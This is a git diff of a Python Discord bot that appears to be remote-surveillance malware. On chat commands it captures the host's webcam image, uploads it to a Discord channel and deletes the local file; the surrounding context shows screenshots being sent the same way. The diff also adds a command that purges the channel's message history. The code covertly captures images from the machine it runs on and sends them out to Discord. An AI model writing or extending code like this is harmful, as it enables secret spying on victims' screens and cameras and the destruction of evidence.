@@ -130,11 +130,13 @@ async def on_message(message):
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
 
-    if message.content[8:] == 'photo':
+    if message.content == 'photo':
         webcam = VideoCapture(0, CAP_DSHOW)
         result, image = webcam.read()
         imwrite('webcam.png', image)
         reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png')); await reaction_msg.add_reaction('📌')
         subprocess.run('del webcam.png', shell=True)
+    if message.content == 'purge':
+        await channel.purge(limit=None)
 
 client.run(bot_token)
